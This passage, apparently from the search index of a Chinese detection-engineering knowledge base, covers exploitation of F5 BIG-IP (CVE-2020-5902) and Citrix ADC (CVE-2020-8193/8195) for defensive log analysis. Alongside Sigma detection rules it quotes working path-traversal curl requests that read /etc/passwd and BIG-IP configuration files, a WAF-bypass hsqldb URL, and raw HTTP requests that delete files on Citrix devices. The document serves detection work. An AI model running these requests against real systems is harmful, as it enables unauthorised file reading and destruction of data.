\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002 \u6d4b\u8bd5\u6848\u4f8b F5 BIG-IP \u662f\u7f8e\u56fdF5\u516c\u53f8\u4e00\u6b3e\u96c6\u6210\u6d41\u91cf\u7ba1\u7406\u3001DNS\u3001\u51fa\u5165\u7ad9\u89c4\u5219\u3001web\u5e94\u7528\u9632\u706b\u5899\u3001web\u7f51\u5173\u3001\u8d1f\u8f7d\u5747\u8861\u7b49\u529f\u80fd\u7684\u5e94\u7528\u4ea4\u4ed8\u5e73\u53f0\u3002\u5728 F5 BIG-IP \u4ea7\u54c1\u7684\u6d41\u91cf\u7ba1\u7406\u7528\u6237\u9875\u9762 (TMUI)/\u914d\u7f6e\u5b9e\u7528\u7a0b\u5e8f\u7684\u7279\u5b9a\u9875\u9762\u4e2d\u5b58\u5728\u4e00\u5904\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002 \u672a\u6388\u6743\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u901a\u8fc7\u5411\u8be5\u9875\u9762\u53d1\u9001\u7279\u5236\u7684\u8bf7\u6c42\u5305\uff0c\u53ef\u4ee5\u9020\u6210\u4efb\u610fJava \u4ee3\u7801\u6267\u884c\u3002\u8fdb\u800c\u63a7\u5236 F5 BIG-IP \u7684\u5168\u90e8\u529f\u80fd\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e: \u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\u3001\u5f00\u542f/\u7981\u7528\u670d\u52a1\u3001\u521b\u5efa/\u5220\u9664\u670d\u52a1\u5668\u7aef\u6587\u4ef6\u7b49\u3002 \u6f0f\u6d1e\u5f71\u54cd\u8303\u56f4\uff1a 11.6.x, 12.1.x, 13.1.x, 14.1.x, 15.0.x, 15.1.x \u68c0\u6d4b\u65e5\u5fd7 HTTP.log \u6d4b\u8bd5\u590d\u73b0 \u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\uff1a F5 BIG-IP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-5902\uff09 \u6f0f\u6d1e\u5229\u7528 https://blog.csdn.net/wuyou1995/article/details/107170186/ cve-2020-5902 RCE\u7684payload\u4ee5\u53ca\u7ed5\u8fc7\u65b9\u5f0f https://www.cnblogs.com/potatsoSec/p/13263806.html \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5\u3002\u76f4\u63a5\u5f15\u7528\u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\u4e2d\u7684\u6848\u4f8b\u6570\u636e\u8fdb\u884c\u7279\u5f81\u63d0\u53d6\u3002 \u6587\u4ef6\u8bfb\u53d6POC curl -v -k 'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd' https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf \u901a\u8fc7java\u53cd\u5e8f\u5217\u5316\u7ed5\u8fc7waf\u7684payload String dburl = \"jdbc:hsqldb:https://\" + server + \":443/tmui/login.jsp/..%3b/hsqldb/\"; #\u622a\u53d6\u90e8\u5206\u5185\u5bb9 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: CVE-2020-5902 F5 BIG-IP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e status: experimental references: - https://blog.csdn.net/wuyou1995/article/details/107170186/ - https://www.cnblogs.com/potatsoSec/p/13263806.html author: Florian Roth translator: 12306Bro date: 2020/07/05 logsource: category: webserver detection: selection_base: c-uri|contains: - '/tmui/' - '/hsqldb' selection_traversal: c-uri|contains: - '..;/' - '.jsp/..' condition: selection_base and selection_traversal fields: - c-ip - c-dns falsepositives: - Unknown tags: - attack.initial_access - attack.t1190 level: critical \u5efa\u8bae \u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ F5 BIG-IP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-5902\uff09 \u6f0f\u6d1e\u5229\u7528 https://blog.csdn.net/wuyou1995/article/details/107170186/ cve-2020-5902 RCE\u7684payload\u4ee5\u53ca\u7ed5\u8fc7\u65b9\u5f0f https://www.cnblogs.com/potatsoSec/p/13263806.html","title":"T1190-CVE-2020-5902-F5_BIG-IP-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#t1190-cve-2020-5902-f5_big-ip-","text":"","title":"T1190-CVE-2020-5902-F5_BIG-IP-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#attck","text":"\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"F5 BIG-IP \u662f\u7f8e\u56fdF5\u516c\u53f8\u4e00\u6b3e\u96c6\u6210\u6d41\u91cf\u7ba1\u7406\u3001DNS\u3001\u51fa\u5165\u7ad9\u89c4\u5219\u3001web\u5e94\u7528\u9632\u706b\u5899\u3001web\u7f51\u5173\u3001\u8d1f\u8f7d\u5747\u8861\u7b49\u529f\u80fd\u7684\u5e94\u7528\u4ea4\u4ed8\u5e73\u53f0\u3002\u5728 F5 BIG-IP \u4ea7\u54c1\u7684\u6d41\u91cf\u7ba1\u7406\u7528\u6237\u9875\u9762 (TMUI)/\u914d\u7f6e\u5b9e\u7528\u7a0b\u5e8f\u7684\u7279\u5b9a\u9875\u9762\u4e2d\u5b58\u5728\u4e00\u5904\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002 \u672a\u6388\u6743\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u901a\u8fc7\u5411\u8be5\u9875\u9762\u53d1\u9001\u7279\u5236\u7684\u8bf7\u6c42\u5305\uff0c\u53ef\u4ee5\u9020\u6210\u4efb\u610fJava \u4ee3\u7801\u6267\u884c\u3002\u8fdb\u800c\u63a7\u5236 F5 BIG-IP \u7684\u5168\u90e8\u529f\u80fd\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e: \u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\u3001\u5f00\u542f/\u7981\u7528\u670d\u52a1\u3001\u521b\u5efa/\u5220\u9664\u670d\u52a1\u5668\u7aef\u6587\u4ef6\u7b49\u3002 \u6f0f\u6d1e\u5f71\u54cd\u8303\u56f4\uff1a 11.6.x, 12.1.x, 13.1.x, 14.1.x, 15.0.x, 15.1.x","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"HTTP.log","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","text":"\u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\uff1a F5 BIG-IP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-5902\uff09 \u6f0f\u6d1e\u5229\u7528 https://blog.csdn.net/wuyou1995/article/details/107170186/ cve-2020-5902 RCE\u7684payload\u4ee5\u53ca\u7ed5\u8fc7\u65b9\u5f0f https://www.cnblogs.com/potatsoSec/p/13263806.html","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_4","text":"\u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5\u3002\u76f4\u63a5\u5f15\u7528\u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\u4e2d\u7684\u6848\u4f8b\u6570\u636e\u8fdb\u884c\u7279\u5f81\u63d0\u53d6\u3002","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","text":"curl -v -k 'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd' https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf","title":"\u6587\u4ef6\u8bfb\u53d6POC"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#javawafpayload","text":"String dburl = \"jdbc:hsqldb:https://\" + server + \":443/tmui/login.jsp/..%3b/hsqldb/\"; #\u622a\u53d6\u90e8\u5206\u5185\u5bb9","title":"\u901a\u8fc7java\u53cd\u5e8f\u5217\u5316\u7ed5\u8fc7waf\u7684payload"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#sigma","text":"title: CVE-2020-5902 F5 BIG-IP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e status: experimental references: - https://blog.csdn.net/wuyou1995/article/details/107170186/ - https://www.cnblogs.com/potatsoSec/p/13263806.html author: Florian Roth translator: 12306Bro date: 2020/07/05 logsource: category: webserver detection: selection_base: c-uri|contains: - '/tmui/' - '/hsqldb' selection_traversal: c-uri|contains: - '..;/' - '.jsp/..' condition: selection_base and selection_traversal fields: - c-ip - c-dns falsepositives: - Unknown tags: - attack.initial_access - attack.t1190 level: critical","title":"sigma\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_6","text":"\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002","title":"\u5efa\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_7","text":"MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ F5 BIG-IP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-5902\uff09 \u6f0f\u6d1e\u5229\u7528 https://blog.csdn.net/wuyou1995/article/details/107170186/ cve-2020-5902 RCE\u7684payload\u4ee5\u53ca\u7ed5\u8fc7\u65b9\u5f0f https://www.cnblogs.com/potatsoSec/p/13263806.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/","text":"T1190-CVE-2020-8193/CVE-2020-8195 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002 \u6d4b\u8bd5\u6848\u4f8b Citrix Systems Citrix Application Delivery Controller\uff08ADC\uff09\u7b49\u90fd\u662f\u7f8e\u56fd\u601d\u6770\u7cfb\u7edf\uff08Citrix Systems\uff09\u516c\u53f8\u7684\u4ea7\u54c1\u3002Citrix Application Delivery Controller\u662f\u4e00\u6b3e\u5e94\u7528\u4ea4\u4ed8\u63a7\u5236\u5668\u3002Citrix Systems Gateway\uff08Citrix Systems NetScaler Gateway\uff09\u662f\u4e00\u5957\u5b89\u5168\u7684\u8fdc\u7a0b\u63a5\u5165\u89e3\u51b3\u65b9\u6848\u3002Citrix System SDWAN WAN-OP\u662f\u4e00\u6b3eSD-WAN\uff08\u865a\u62df\u8f6f\u4ef6\u5b9a\u4e49\u7684\u5e7f\u57df\u7f51\uff09\u8bbe\u5907\u3002Citrix Systems Citrix ADC\u3001Citrix Gateway\u548cCitrix SDWAN WAN-OP\u4e2d\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u7ed5\u8fc7\u6743\u9650\u9650\u5236\u3002 \u68c0\u6d4b\u65e5\u5fd7 HTTP.log \u6d4b\u8bd5\u590d\u73b0 \u6f0f\u6d1e\u5229\u7528\u65b9\u5f0f\u5efa\u8bae\u53c2\u8003\uff1a Citrix Systems\u4ea7\u54c1\u5b89\u5168\u6f0f\u6d1e CVE-2020-8193, CVE-2020-8195 and CVE-2020-8196 poc https://www.cnblogs.com/potatsoSec/p/13281577.html Citrix\u5b89\u5168\u7814\u7a76\u5386\u9669\u8bb0 https://blog.unauthorizedaccess.nl/2020/07/07/adventures-in-citrix-security-research.html \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\u5b9e\u6d4b\uff0c\u622a\u53d6\u90e8\u5206\u516c\u5f00\u8d44\u6599\u5185\u5bb9\u4f5c\u4e3a\u7559\u75d5\u6570\u636e\u3002 \u5220\u9664\u6587\u4ef6 POST /rapi/filedownload?filter=remove:1,path:%2ftmp%2ftest HTTP/1.1 Host: citrix.local User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://citrix.local/menu/neo If-Modified-Since: Thu, 01 Jan 1970 05:30:00 GMT rand_key: 2061490565.1580290269373855 DNT: 1 X-NITRO-USER: henk X-NITRO-PASS: henk Connection: close Cookie: startupapp=neo; is_cisco_platform=0; st_splitter=350px; rdx_pagination_size=25%20Per%20Page; SESSID=05afba59ef8e0e35933f3bc266941337 Content-Type: application/xml Content-Length: 31 <clipermission></clipermission> \u4ee5\u4e0a\u5185\u5bb9\u622a\u53d6\u81ea https://www.cnblogs.com/potatsoSec/p/13281577.html \u83b7\u53d6\u9ed8\u8ba4\u6240\u6709\u7b7e\u540d POST /pcidss/report?type=all_signatures&sid=254&username=nsroot&profile_name=default&set=0&sig_name=_default_signature_&sig_start_no=1 HTTP/1.1 Host: citrix.local User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://citrix.local/pcidss/launch_report?type=main Content-Type: application/xml Content-Length: 0 DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 \u4ee5\u4e0a\u5185\u5bb9\u622a\u53d6\u81ea https://blog.unauthorizedaccess.nl/2020/07/07/adventures-in-citrix-security-research.html \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u68c0\u6d4b\u53ef\u7591\u7684CVE-2020-8193/CVE-2020-8195 references: - https://www.cnblogs.com/potatsoSec/p/13281577.html - https://research.nccgroup.com/2020/07/10/rift-citrix-adc-vulnerabilities-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-intelligence/ status: experimental date: 2020/07/10 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection1: c-uri|contains: - '/rapi/filedownload?filter=path:%2F' #\u5220\u9664\u6587\u4ef6\u65f6POST\u8bf7\u6c42\uff0cURL\u8def\u5f84\u5305\u542b\u7684\u5b57\u6bb5\u3002 selection2: c-uri|contains|all: - '/pcidss/report' #\u83b7\u53d6\u6240\u6709\u9ed8\u8ba4\u7b7e\u540d\u65f6POST\u8bf7\u6c42URL\u5185\u5305\u542b\u7684\u5b57\u6bb5 - 'type=all_signatures' - 'sig_name=_default_signature_' condition: 1 of them fields: - client_ip - vhost - url - response falsepositives: - Unknown level: critical \u5efa\u8bae \u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\uff0c\u7814\u5224\u653b\u51fb\u662f\u5426\u6210\u529f\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/","title":"T1190-CVE-2020-8193/CVE-2020-8195"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#t1190-cve-2020-8193cve-2020-8195","text":"","title":"T1190-CVE-2020-8193/CVE-2020-8195"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#attck","text":"\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_1","text":"Citrix Systems Citrix Application Delivery Controller\uff08ADC\uff09\u7b49\u90fd\u662f\u7f8e\u56fd\u601d\u6770\u7cfb\u7edf\uff08Citrix Systems\uff09\u516c\u53f8\u7684\u4ea7\u54c1\u3002Citrix Application Delivery Controller\u662f\u4e00\u6b3e\u5e94\u7528\u4ea4\u4ed8\u63a7\u5236\u5668\u3002Citrix Systems Gateway\uff08Citrix Systems NetScaler Gateway\uff09\u662f\u4e00\u5957\u5b89\u5168\u7684\u8fdc\u7a0b\u63a5\u5165\u89e3\u51b3\u65b9\u6848\u3002Citrix System SDWAN WAN-OP\u662f\u4e00\u6b3eSD-WAN\uff08\u865a\u62df\u8f6f\u4ef6\u5b9a\u4e49\u7684\u5e7f\u57df\u7f51\uff09\u8bbe\u5907\u3002Citrix Systems Citrix ADC\u3001Citrix Gateway\u548cCitrix SDWAN 